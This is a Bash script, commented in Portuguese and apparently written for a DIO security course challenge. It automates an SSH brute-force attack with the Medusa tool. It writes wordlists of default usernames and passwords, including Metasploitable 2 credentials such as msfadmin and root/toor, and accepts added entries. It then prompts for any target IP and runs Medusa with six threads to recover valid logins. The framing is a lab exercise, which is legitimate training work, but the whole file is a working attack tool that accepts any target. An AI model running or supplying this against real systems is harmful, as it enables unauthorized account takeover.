#!/bin/bash

# --- Configurações Iniciais ---
USERS_FILE="users_ssh.txt"
PASS_FILE="pass_ssh.txt"
# Usuários e senhas padrão para fins de laboratório (incluindo usuários comuns do Metasploitable 2)
DEFAULT_USERS=("msfadmin" "user" "root" "support" "admin" "ubuntu")
DEFAULT_PASSWORDS=("password" "123456" "admin" "msfadmin" "toor" "access")

# --- Funções ---

# 1. Cria a wordlist de Usuários (com opção de adicionar)
criar_lista_usuarios() {
    echo "--- 🧑‍💻 Geração da Lista de Usuários (SSH) ---"
    
    # Adicionar usuários padrão
    printf "%s\n" "${DEFAULT_USERS[@]}" > $USERS_FILE
    
    read -p "1 - Deseja adicionar um usuário personalizado? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite os usuários (um por linha). Pressione ENTER duas vezes para finalizar."
        # Loop para capturar entradas
        while IFS= read -r user; do
            [[ -z "$user" ]] && break
            echo "$user" >> $USERS_FILE
            echo "Usuário '$user' adicionado."
        done
    fi
    echo "[SUCESSO] Lista de usuários salva em $USERS_FILE com $(wc -l < $USERS_FILE) itens."
    echo ""
}

# 2. Cria a wordlist de Senhas (com opção de adicionar)
criar_lista_senhas() {
    echo "--- 🔑 Geração da Lista de Senhas (SSH) ---"

    # Adicionar senhas padrão
    printf "%s\n" "${DEFAULT_PASSWORDS[@]}" > $PASS_FILE

    read -p "2 - Deseja adicionar uma senha personalizada? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite as senhas (uma por linha). Pressione ENTER duas vezes para finalizar."
        # Loop para capturar entradas
        while IFS= read -r pass; do
            [[ -z "$pass" ]] && break
            echo "$pass" >> $PASS_FILE
            echo "Senha '$pass' adicionada."
        done
    fi
    echo "[SUCESSO] Lista de senhas salva em $PASS_FILE com $(wc -l < $PASS_FILE) itens."
    echo ""
}

# 3. Executa o ataque Medusa
executar_medusa() {
    echo "=================================================="
    echo "📢 ETAPA DE EXECUÇÃO DO MEDUSA (SSH) INICIADA 📢"
    echo "=================================================="

    # Verifica se a ferramenta Medusa está instalada
    if ! command -v medusa &> /dev/null
    then
        echo "[ERRO] A ferramenta 'medusa' não foi encontrada. Instale-a no Kali Linux."
        exit 1
    fi
    
    # --- Coleta o IP do alvo ---
    read -p "➡️ Digite o IP do ALVO VULNERÁVEL (Metasploitable 2 ou outra VM de teste): " TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        echo "[ERRO] O endereço IP não pode estar vazio. Abortando."
        exit 1
    fi

    echo ""
    echo "🚀 Executando Força Bruta SSH contra $TARGET_IP (Porta 22)..."
    echo "Comando: medusa -h $TARGET_IP -U $USERS_FILE -P $PASS_FILE -M ssh -t 6"
    echo ""

    # Execução do ataque (6 threads - Ajustado para SSH)
    medusa -h "$TARGET_IP" -U "$USERS_FILE" -P "$PASS_FILE" -M ssh -t 6
    
    # ----------------------------------------------------
    # O Medusa irá imprimir o resultado (credenciais válidas) diretamente no terminal
    # ----------------------------------------------------
    
    echo ""
    echo "✅ FIM da execução do Medusa. Verifique as credenciais encontradas acima."
}

# --- Fluxo Principal ---
main() {
    echo "--- 💻 Desafio DIO: Automação de Força Bruta SSH (Kali Linux) ---"
    
    criar_lista_usuarios
    criar_lista_senhas
    executar_medusa
    
    echo "--- Limpeza de Arquivos Temporários ---"
    rm -f $USERS_FILE $PASS_FILE
    echo "[CONCLUÍDO] Arquivos $USERS_FILE e $PASS_FILE removidos."
}

# Inicia o script
main